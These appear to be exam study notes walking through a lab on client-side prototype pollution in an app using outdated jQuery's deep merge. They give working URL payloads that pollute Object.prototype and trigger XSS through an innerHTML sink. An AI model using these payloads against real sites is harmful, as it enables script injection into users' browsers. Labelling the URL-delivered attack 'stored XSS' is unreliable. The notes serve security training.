# Client-Side Prototype Pollution – Walkthrough & Payload Examples

> [!info]  
> **Overview**  
> This walkthrough demonstrates how to detect and exploit **client-side prototype pollution** in a JavaScript web app using an **outdated version of jQuery (v2.x)**.  
> Focus: tracing untrusted input to object merging and finding a vulnerable _sink_ (e.g., XSS).

---

## Initial Application Behavior & Recon

- The UI shows **persistence** after refresh → implies **`localStorage`** usage.
    
- A **settings UI** allows users to toggle preferences.
    

> [!tip]  
> Open DevTools (`F12`) and go to `Sources > index.html` to inspect the JavaScript code.

### Observations from Code Review

- jQuery **v2.x** is in use (known to be vulnerable to prototype pollution).
    
- The `extend()` function is called to **merge objects**.
    
- `applyUserSettingsFromUrl()` pulls JSON from the URL’s `settings` parameter.
    

---

## Critical Code to Watch

```js
const userSettings = JSON.parse(params.settings);
const updatedPreferences = $.extend(true, currentPreferences, userSettings);
```

- `$.extend(true, ...)` performs a **deep merge**.
    
- Input is fully **user-controlled** via `?settings=...` in the URL.
    

> [!important]  
> **Exam Note:**  
> When using jQuery versions **below 3.4.0**, `$.extend(true, ...)` with _unsanitized input_ is a classic **client-side prototype pollution vector**.

---

## Input Flow Testing (Step-by-Step)

### Step 1: Trigger the Merge Function

Start with invalid JSON to observe how the app handles it:

```
?settings=test
```

- Triggers a `JSON.parse` error.
    

Then try valid JSON:

```
?settings={"test":true}
```

- Loads successfully → confirms the `settings` parameter is parsed and used.
    

> Set breakpoints at `getQueryParams`, `applyUserSettingsFromUrl`, and `extend()` to observe execution.

---

### Step 2: Prototype Pollution Test

Inject a basic pollution payload:

```
?settings={"__proto__":{"polluted":true}}
```

Then check in the browser console:

```js
console.log({}.polluted); // should output: true
```

> [!important]  
> **Exam Reminder:**  
> Prototype pollution is verified by checking `Object.prototype` or logging `{}` in the console.

---

## Finding the Sink (XSS Injection)

Relevant JavaScript snippet:

```js
const message = userPrefs.message || 'Settings updated';
document.getElementById('status').innerHTML = message;
```

If `message` exists (and is polluted), it gets rendered via `innerHTML`.

### Exploitable Payload for XSS:

```
?settings={"__proto__":{"message":"<img src=x onerror=prompt(1)>"}}
```

- Pollutes the `message` property.
    
- Renders unsanitized HTML → **XSS triggered** when the `status` element is updated.
    

> [!danger]  
> **Exam Critical:**  
> This is the **sink** that enables **stored XSS** through polluted global object properties.

---

## Summary of Exploitation Flow

1. App uses **jQuery v2.x** → vulnerable to deep merges.
    
2. Input is parsed from `location.search` → `?settings=...`.
    
3. Payload like `{"__proto__":{"...":...}}` alters the global object prototype.
    
4. Application reads polluted property (`message`) from `userPrefs`.
    
5. XSS occurs when polluted value is written to the DOM via `innerHTML`.
    

---

## Key Takeaways & Exam Reminders

> [!success]  
> **Open-Book Exam Tips:**
> 
> - Identify usage of `$.extend(true, ...)` in **outdated jQuery**.
>     
> - Confirm pollution via `Object.prototype` or `console.log({})`.
>     
> - Test injection points from `location.search` / query params.
>     
> - If a sink uses `innerHTML`, try polluting properties like `message`.
>     
> - _Clear `localStorage` or cached preferences_ if testing fails to reset the app.
>     
